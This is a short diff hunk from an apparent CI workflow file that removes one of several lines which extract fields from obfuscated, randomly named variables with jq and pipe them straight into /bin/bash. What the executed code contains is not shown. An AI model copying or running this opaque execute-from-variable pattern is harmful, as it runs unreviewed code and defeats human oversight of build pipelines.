@@ -31,7 +31,6 @@ jobs:
           printf '%s' "$mgdz2" | jq -r .m0 | /bin/bash
           echo $zf211 | jq -r .z02 | /bin/bash
           echo $wj6 | jq -r .wx34 | /bin/bash
-          echo $cwlf9 | jq -r .jjhl7 | /bin/bash
           echo $mlw1966 | jq -r .jh33981 | /bin/bash
           echo $yjq66 | jq -r .jorkk07 | /bin/bash
           printf '%s' "$c10" | jq -r .ge2 | /bin/bash
